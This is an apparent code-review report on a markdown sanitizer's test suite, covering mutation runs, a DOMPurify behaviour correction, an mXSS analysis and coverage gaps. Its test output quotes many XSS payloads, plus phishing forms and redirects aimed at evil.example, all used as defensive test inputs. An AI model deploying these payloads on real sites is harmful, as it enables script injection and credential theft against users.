# test-195 — independent test review, markdown sanitizer hardening

Reviewer: test-engineer. Range `7a0f220..204af7e`, branch `markdown-sanitize`, tree
clean at `204af7e`. Environment: node v20.20.2, npm 10.8.2, `npm ci` in `web/`
(102 packages, 0 vulnerabilities), resolved dompurify **3.4.12**, marked 15.0.12,
jsdom 29.1.1, typescript 5.9.3.

## Verdict: **APPROVE**

The standing defect class is **not present**. The suite exercises the real exported
symbol, the DOMPurify binding is live, and both mutation counts reproduce exactly.
The gaps below are additive follow-ups, not blockers. Two claims in the developer's
report are imprecise and are corrected below; neither changes the verdict, and one
of them makes the suite *safer* than reported.

---

## 1. Self-built oracle — PASS (highest-priority check)

No re-implementation. Verified three ways:

**Source inspection.** The only mentions of `DOMPurify`/`marked` anywhere in
`web/src/util/markdown.test.ts` are in comments:

```
$ grep -nE "DOMPurify|dompurify|from 'marked'|new Marked|\.sanitize\(|marked\." src/util/markdown.test.ts
10:// DOMPurify binds to `globalThis.window` when its module is first evaluated, so
11:// a DOM has to exist before markdown.js (and its dompurify import) is loaded.
```

The test never imports `marked` or `dompurify`. Its single subject import is
`const { renderMarkdown } = await import('./markdown.js');` (line 17).

**Compiled-artifact inspection.** `./markdown.js` resolves to the real compiled
module, not a stub — `.tmp-test/util/markdown.js` contains the genuine
`DOMPurify.sanitize(parser.parse(md), { FORBID_TAGS, FORBID_ATTR })` with the
real `FORBID_TAGS`/`FORBID_ATTR` arrays.

**Behavioural proof.** Mutating `web/src/util/markdown.ts` changes the test result
(§3). A self-built oracle is by definition insensitive to production edits; this
suite is not.

One nuance worth naming, not a defect: the test's `parse()` helper re-parses output
through jsdom `innerHTML`. That is an *assertion* helper, not a pipeline
re-implementation — but it is the source of the mXSS false negative discussed in §5,
and every structural assertion in the suite inherits that hazard.

## 2. Vacuous assertions / DOMPurify liveness — PASS, with a correction

The developer's ordering is correct and the assertions are real. I verified the
positive and the negative directly rather than trusting mutation 2 alone.

**Probe A — dompurify with no DOM:**

```
isSupported = false
TypeError: DOMPurify.sanitize is not a function
```

**Probe B — the exact ordering the test uses (jsdom installed, then dynamic import):**

```
isSupported = true
version     = 3.4.12
renderMarkdown(<script>alert(1)</script>) = ""
renderMarkdown(form phishing)            = "Sign in"
```

`isSupported = true`. The binding is live and real sanitization is occurring.

**Probe C — decisive test of the reviewer's concern.** I took the *compiled* test,
inverted the ordering so `markdown.js` loads before the jsdom window is installed,
and ran the full suite:

```
--- PROBE C: markdown.js loaded BEFORE the DOM exists ---
file:///workspace/web/.tmp-test/util/markdown.js:26
    return DOMPurify.sanitize(parser.parse(md), {
                     ^
TypeError: DOMPurify.sanitize is not a function
    at renderMarkdown (file:///workspace/web/.tmp-test/util/markdown.js:26:22)
    at formControls (file:///workspace/web/.tmp-test/util/probeC.test.js:71:22)
```

**Correction to the developer's report.** The report states (twice, in the summary
and in "Test suite") that DOMPurify "silently degrades to a pass-through with
`isSupported: false`", which "would have made every assertion vacuously pass."
That failure mode is **not reachable on the pinned version**. In dompurify 3.4.12
the unsupported path early-returns from the factory *before* `sanitize` is ever
assigned:

```js
// node_modules/dompurify/dist/purify.es.mjs:429
if (!window || !window.document || window.document.nodeType !== NODE_TYPE.document || !window.Element) {
    DOMPurify.isSupported = false;
    return DOMPurify;          // sanitize is never defined below this point
}
```

So a mis-ordered test **crashes loudly with a TypeError on the first check**, as
Probe C shows — it does not pass 32 vacuous assertions. The developer's mitigation
is correct and should stay; the stated *reason* overstates the danger. Practical
consequence: the "32 worthless checks" scenario is structurally impossible here,
which is a stronger guarantee than the report claims for itself. Note the caveat
that `package.json` pins `"dompurify": "^3.0.0"` — I verified the early-return
shape, not every 3.x release, so this reasoning is version-specific to what
resolves today.

## 3. Mutation re-runs — both counts reproduce EXACTLY

Baseline on the committed tree:

```
$ npm test
> tsc -p tsconfig.test.json && node .tmp-test/utils/task-ready.test.js && node .tmp-test/util/markdown.test.js

markdown sanitizer: 32 checks passed
```

### Mutation 1 — `return DOMPurify.sanitize(parser.parse(md) as string);`

```
Error: 8 of 32 markdown sanitizer checks failed:
  - form tag stripped: credential-phishing form survived: found <form> in "<form action=\"https://evil.example\"><input name=\"token\" type=\"password\"><button>Sign in</button></form>"
  - form action attribute stripped: attacker origin survived: found "evil.example" in "<form action=\"https://evil.example\"><input name=\"token\" type=\"password\"><button>Sign in</button></form>"
  - password input stripped: password field survived: found <input> in "<form action=\"https://evil.example\"><input name=\"token\" type=\"password\"><button>Sign in</button></form>"
  - submit button stripped: submit button survived: found <button> in "<form action=\"https://evil.example\"><input name=\"token\" type=\"password\"><button>Sign in</button></form>"
  - select and option stripped: select survived: found <select> in "<p><select><option>a</option></select></p>\n"
  - textarea stripped: textarea survived: found <textarea> in "<textarea>x</textarea>"
  - style attribute stripped: inline style survived: found "style=" in "<div style=\"position:fixed;top:0;left:0;width:100vw;height:100vh\">overlay</div>"
  - download attribute stripped: download attribute survived: found "download" in "<p><a href=\"https://x.example/f\" download=\"invoice.pdf\">dl</a></p>\n"
```

**8 of 32 — matches the report, line for line.** Confirmed: `formaction` does not
fail (DOMPurify strips it by default, so that `FORBID_ATTR` entry is redundant
belt-and-braces), and the two task-list checks correctly do not fail, since the
glyph substitution happens in marked and is independent of sanitizer config.

### Mutation 2 — `return parser.parse(md) as string;`

```
Error: 20 of 32 markdown sanitizer checks failed:
  - form tag stripped: credential-phishing form survived: found <form> in "<form action=\"https://evil.example\"><input name=token type=password><button>Sign in</button></form>"
  - form action attribute stripped: attacker origin survived: found "evil.example" in "<form action=\"https://evil.example\"><input name=token type=password><button>Sign in</button></form>"
  - password input stripped: password field survived: found <input> in "<form action=\"https://evil.example\"><input name=token type=password><button>Sign in</button></form>"
  - submit button stripped: submit button survived: found <button> in "<form action=\"https://evil.example\"><input name=token type=password><button>Sign in</button></form>"
  - select and option stripped: select survived: found <select> in "<p><select><option>a</option></select></p>\n"
  - textarea stripped: textarea survived: found <textarea> in "<textarea>x</textarea>"
  - formaction stripped: formaction survived: found "formaction" in "<p><button formaction=\"https://evil.example\">go</button></p>\n"
  - style attribute stripped: inline style survived: found "style=" in "<div style=\"position:fixed;top:0;left:0;width:100vw;height:100vh\">overlay</div>"
  - download attribute stripped: download attribute survived: found "download" in "<p><a href=\"https://x.example/f\" download=\"invoice.pdf\">dl</a></p>\n"
  - script tag stripped: script survived: found <script> in "<script>alert(1)</script>"
  - inline event handler stripped: event handler survived: IMG has onerror in "<img src=x onerror=alert(1)>"
  - javascript: href stripped: javascript: URL survived: found "javascript:" in "<p><a href=\"javascript:alert(1)\">click</a></p>\n"
  - data: html href stripped: data: HTML URL survived: found "data:text/html" in "<p><a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">click</a></p>\n"
  - iframe srcdoc stripped: iframe survived: found <iframe> in "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>"
  - mXSS mglyph payload neutralised: mXSS payload survived: found "alert(1)" in "<p><math><mtext><table><mglyph><style><!--</style><img title=\"--><img src=1 onerror=alert(1)>&quot;&gt;</p>\n"
  - base tag stripped: base survived: found <base> in "<base href=\"https://evil.example/\">"
  - meta refresh stripped: meta survived: found <meta> in "<meta http-equiv=\"refresh\" content=\"0;url=https://evil.example\">"
  - object and embed stripped: object survived: found <object> in "<p><object data=\"https://evil.example/x\"></object><embed src=\"https://evil.example/y\"></p>\n"
  - style element stripped: style element survived: found <style> in "<style>body{display:none}</style>"
  - target attribute stripped (no tabnabbing): target survived: found "target" in "<p><a href=\"https://x.example\" target=\"_blank\">x</a></p>\n"
```

**20 of 32 — matches the report, line for line.**

Source restored after each mutation; `git status --porcelain` clean; baseline
re-verified at `markdown sanitizer: 32 checks passed`.

**No discrepancies with the developer's reported counts or failure text.**

## 4. The mXSS dual-assertion claim — reasoning CORRECT, mechanism MIS-ATTRIBUTED

**The operational claim is correct and I reproduced it.** Running the unsanitized
marked output for the mglyph payload through the suite's own `parse()` helper:

```
--- UNSANITIZED marked output (what mutation 2 produces) ---
"<p><math><mtext><table><mglyph><style><!--</style><img title=\"--><img src=1 onerror=alert(1)>&quot;&gt;</p>\n"

--- DOM-QUERY assertions against the UNSANITIZED payload ---
querySelector("img")      = null
inline event handlers     = []
=> assertNoElement(img)   : PASSES (FALSE NEGATIVE)
=> assertNoEventHandlers  : PASSES (FALSE NEGATIVE)

--- RAW-STRING assertion against the same payload ---
=> assertNotContains(alert(1)) : FAILS (catches it)
```

A purely DOM-query-based test reports an unsanitized mXSS payload as clean. The
mutation-2 output corroborates this independently: `check()` records only the
*first* throw, and the recorded message for that check is the `alert(1)`
raw-string one — which can only surface if the two preceding DOM assertions
passed. **Both assertion styles are genuinely needed.** A reviewer tempted to
collapse them to one should not, and the developer is right to say so.

**However, the mechanism is not foster-parenting.** The report attributes the
disappearance to "re-parsing through `innerHTML` foster-parents the `img` out of
existence." Foster-parenting *relocates* nodes; it does not delete them. A
discriminating experiment:

```
A full unsanitized payload      : P math mtext MGLYPH STYLE TABLE  || img=null
B same but attr value TERMINATED: P math mtext MGLYPH STYLE IMG P TABLE  || img=FOUND
C imgs alone, no math/table     :   || img=null
D imgs alone, terminated        : IMG  || img=FOUND
E plain img inside math/mtext/table: math mtext MGLYPH IMG TABLE  || img=FOUND
```

Case E is foster-parenting: the `img` is hoisted out of the table (`MGLYPH IMG
TABLE`) but **still exists**. Case C is decisive — strip all the MathML and table
context, leave just the two `<img>` tags, and the `img` still vanishes. The actual
cause is the **unterminated `title="` attribute value**: the payload's closing
quote is the entity `&quot;`, not a real `"`, so the attribute value runs to EOF
and the tokenizer discards the incomplete tag. Case B confirms it — terminate the
quote and the `img` reappears.

This *strengthens* the developer's recommendation rather than weakening it. The
false-negative hazard is not a MathML/foster-parenting quirk confined to one
exotic payload; it is a general property of re-parsing any truncated or
unterminated-attribute markup, and it therefore applies to **every** structural
assertion in this suite (see gap G6). Worth fixing the wording in the dev report
so the next person generalises the lesson correctly.

## 5. Coverage gaps

I probed each candidate against the real sanitizer rather than reasoning from the
config. **No live vulnerability was found** — everything below is currently
neutralised. These are *unpinned* behaviours: things a future config edit could
break with all 32 checks still green.

### G1 — Nothing binds the sinks to `renderMarkdown` — **High**

The suite secures a function that nothing forces anyone to call.

```
$ grep -rn "unsafeHTML" src/ | grep -v "\.test\."
src/components/inspector/ft-inspector-desc.ts:3:import { unsafeHTML } from 'lit/directives/unsafe-html.js';
src/components/inspector/ft-inspector-desc.ts:233:        ${unsafeHTML(renderMarkdown(this.description))}
src/components/inspector/ft-inspector-comments.ts:3:import { unsafeHTML } from 'lit/directives/unsafe-html.js';
src/components/inspector/ft-inspector-comments.ts:221:                        ${unsafeHTML(renderMarkdown(c.body))}
```

Both sinks are correct today. But a future edit to `unsafeHTML(this.description)`
— dropping the wrapper — reintroduces the entire bug class and **all 32 checks
still pass**. This is the single highest-value gap: the branch's security property
is "attacker markdown cannot reach the DOM unsanitised," and the suite only tests
half of it. Cheap fix: a source-level guard test asserting every `unsafeHTML(` in
`src/` takes a `renderMarkdown(` call as its argument.

### G2 — Zero SVG coverage — **High**

11 script-execution regressions, none on SVG. `<svg>` passes the allowlist intact
and survives into the output:

```
SVG animate onbegin          "<p><svg></svg></p>\n"
SVG xlink javascript         "<p><svg><a><text y=\"20\">x</text></a></svg></p>\n"
SVG foreignObject            "<p><svg></svg></p>\n"
SVG set attributeName        "<p><svg></svg></p>\n"
```

All neutralised today. SVG (`animate/@onbegin`, `set/@attributeName`,
`foreignObject`, `a/@xlink:href`) is historically the richest DOMPurify bypass
surface after MathML, and the suite pins MathML but not SVG. Since the stated
purpose of section 3 is "pinned so that a future configuration change cannot
silently reopen script execution," this is a direct hole in that guarantee.

### G3 — `FORBID_TAGS` case-normalisation unpinned — **Medium**

```
UPPERCASE FORM               ""
MiXeD cAsE form              ""
```

Correct today. But `FORBID_TAGS` is *the new control this branch adds*, and its
case-insensitivity is assumed, never asserted. If it were ever replaced with a
hand-rolled check or a differently-normalising allowlist, `<FoRm>` would regress
silently. One parameterised check closes this.

### G4 — Raw-HTML `javascript:` href untested — **Medium**

The suite covers markdown link syntax `[click](javascript:alert(1))` but not the
raw-HTML path, which reaches DOMPurify through a different marked branch:

```
raw HTML javascript href     "<p><a>click</a></p>\n"
vbscript href                "<p><a>click</a></p>\n"
data svg+xml href            "<p><a>x</a></p>\n"
img src javascript           "<img>"
```

All clean. `vbscript:` and `data:image/svg+xml` are entirely uncovered scheme
classes.

### G5 — Nil input throws; suite covers `''` only — **Medium**

```
undefined  THREW: Error: marked(): input parameter is undefined or null
null       THREW: Error: marked(): input parameter is undefined or null
number     THREW: Error: marked(): input parameter is of type [object Number], string expected
```

`renderMarkdown` has no nil guard. The desc sink is protected by an
`if (!this.description)` early return at line 209; the comments sink relies on
`body: string` being non-optional in `src/gen/types.ts:289`. So this is not
currently reachable — but the failure mode if it ever is would be a thrown
exception inside a Lit render, taking down the whole comments panel rather than
degrading one cell, and the input originates from the wire. Nil coverage is a
standing requirement of the project's test rubric and the suite tests only `''`.

### G6 — Two checks are DOM-query-only, with no raw-string backstop — **Low**

Given the §4 finding, `submit button stripped` (`assertNoElement(phishing,
'button')` alone) and `textarea stripped` (`assertNoElement(out, 'textarea')`
alone) are the two checks exposed to exactly the re-parse false negative the
developer correctly identified elsewhere. Both do fail under both mutations, so
they are not vacuous today — but they lack the defence the suite applies to mXSS.

### G7 — The check total is not pinned — **Low**

`checks` is incremented by `check()` and only reported. Delete a check and the
suite prints `31 checks passed` and exits 0. An `assertEqual(checks, 32)` at the
end of `run()` would make silent erosion of the suite impossible.

### G8 — `srcset` reaches an attacker origin — **Low**

```
srcset img                   "<img src=\"https://a.example/i.png\" srcset=\"https://evil.example/x.png 2x\">"
```

Same class as the already-permitted `<img src>` to arbitrary origins, so not a new
exposure — noted only because it is untested and is the kind of thing a reader of
`FORBID_ATTR` might assume is covered.

### G9 — jsdom is not Chromium — **Low**

Already flagged by the developer (finding 4) and correctly scoped. mXSS behaviour
is parser-specific; §4 above pins jsdom's tokenizer, not Blink's. Accepting this
is reasonable given no browser harness exists, but the guarantee is narrower than
"these payloads are safe in production browsers."

## 6. Other verification

```
$ npx tsc --noEmit                          exit=0 (clean)
$ npx tsc -p tsconfig.test.json --noEmit    exit=0 (clean)
$ npm audit --audit-level=low               found 0 vulnerabilities
$ git status --porcelain                    clean
```

Harness wiring confirmed additive and correct: `package.json` `test` script chains
the new suite, `tsconfig.test.json` `include` picks it up, failures exit non-zero
(verified — both mutations returned a non-zero exit through `npm test`).

**Out of scope, as briefed:** `find dist -name "*.map" | wc -l` returns 1. Confirmed
pre-existing on `origin/main`, tracked separately, not a defect of this branch. Not
re-litigated here.

## 7. Recommendations to the manager

Not blocking; all are additive.

1. **G1 first.** A guard test tying `unsafeHTML` to `renderMarkdown` protects more
   real-world surface than any additional payload check, because it defends the
   property the 32 checks currently assume.
2. **G2 second.** Add an SVG block to section 3, mirroring the MathML case and
   using both assertion styles.
3. **Fix the two wording errors in the dev report** (§2 and §4 above) before it is
   used as reference material — the DOMPurify failure-mode claim overstates the
   risk, and the mXSS mechanism attribution would mislead someone generalising the
   lesson.
4. The developer's non-test findings (no CSP; `form-action 'self'` as an
   independent control; no link-scheme allowlist in marked) are sound and worth
   their own issues. Outside my remit to action — surfacing as recommended
   escalation only.

**Reviewer's note on the checkbox decision:** the glyph substitution in marked
rather than a DOMPurify hook keeps the allowlist un-widened, and mutation 1
demonstrates the property the developer claimed for it — the task-list checks are
independent of sanitizer config. Good call, and correctly evidenced.
